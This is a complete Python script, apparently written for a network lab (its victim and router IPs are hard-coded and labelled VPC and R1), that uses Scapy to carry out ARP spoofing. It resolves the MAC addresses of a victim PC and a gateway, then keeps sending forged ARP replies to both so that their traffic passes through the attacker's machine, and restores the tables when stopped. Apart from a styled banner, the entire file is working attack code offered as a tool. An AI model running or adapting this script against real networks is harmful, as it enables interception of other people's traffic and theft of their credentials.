#!/usr/bin/env python3
import sys
import time
import os

# --- CONFIGURACIÓN (TUS IPs) ---
ip_victima = "20.24.11.3"   # La PC (VPC)
ip_gateway = "20.24.11.1"    # El Router (R1)
interfaz_red = "eth0"
# -------------------------------

# --- COLORES AZUL Y BLANCO ---
AZUL = '\033[96m'  # Cian Brillante (Azul Eléctrico)
NEGRITA = '\033[1m'
BLANCO = '\033[0m'

os.system('clear')
print(f"{AZUL}[+] Iniciando protocolos de interceptación...{BLANCO}")
sys.stdout.flush()

try:
    # Silenciar Scapy al cargar
    stderr_original = sys.stderr
    sys.stderr = open(os.devnull, 'w')
    from scapy.all import *
    sys.stderr = stderr_original
except ImportError:
    print(f"{AZUL}[X] Error: Falta Scapy.{BLANCO}")
    sys.exit(1)

# Función para buscar MAC
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=interfaz_red)
    if ans:
        return ans[0][1].hwsrc
    return None

# --- INTERFAZ GRÁFICA AZUL ---
os.system('clear')

banner = f"""{AZUL}{NEGRITA}
    _    ____  ____    ____       _                 
   / \  |  _ \|  _ \  |  _ \ ___ (_)___  ___  _ __  
  / _ \ | |_) | |_) | | |_) / _ \| / __|/ _ \| '_ \ 
 / ___ \|  _ <|  __/  |  __/ (_) | \__ \ (_) | | | |
/_/   \_\_| \_\_|     |_|   \___/|_|___/\___/|_| |_|
                                                     
             ~ by Abi.R (Blue Mode) ~
{BLANCO}"""

print(banner)
print(f"{AZUL}" + "♦ " * 25)

# Escaneo inicial
print(f" ⚡ Escanear Víctima ({ip_victima})... ", end="")
sys.stdout.flush()
mac_victima = get_mac(ip_victima)

if not mac_victima:
    print(f"\n{AZUL}[X] ERROR: No encuentro a la víctima.{BLANCO}")
    sys.exit(1)
print(f"Encontrada: {mac_victima}")

print(f" ⚡ Escanear Router  ({ip_gateway})... ", end="")
sys.stdout.flush()
mac_gateway = get_mac(ip_gateway)

if not mac_gateway:
    print(f"\n{AZUL}[X] ERROR: No encuentro al Router.{BLANCO}")
    sys.exit(1)
print(f"Encontrado: {mac_gateway}")

print(f"\n ⚡ ESTADO:          {NEGRITA}INTERCEPTANDO TRÁFICO 💎{AZUL}")
print("♦ " * 25 + f"{BLANCO}")
print(f"\n{AZUL}[!!!] ENVENENANDO TABLAS ARP... (Presiona Ctrl + C para parar){BLANCO}")

# --- BUCLE DE ATAQUE ---
try:
    while True:
        # Engañar a la Víctima
        spoof_v = ARP(op=2, pdst=ip_victima, hwdst=mac_victima, psrc=ip_gateway)
        # Engañar al Router
        spoof_g = ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victima)

        send(spoof_v, verbose=0, iface=interfaz_red)
        send(spoof_g, verbose=0, iface=interfaz_red)
        
        # Feedback visual (Diamante Azul)
        sys.stdout.write(f"{AZUL}♦ {BLANCO}")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print(f"\n\n{AZUL}[⚡] Interceptación detenida. Restaurando la red...{BLANCO}")
    # Restauración de cortesía
    send(ARP(op=2, pdst=ip_victima, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_gateway, hwsrc=mac_gateway), count=5, verbose=0)
    send(ARP(op=2, pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_victima, hwsrc=mac_victima), count=5, verbose=0)
    print(f"{AZUL}[✔] Red limpia. ¡Misión cumplida!{BLANCO}")

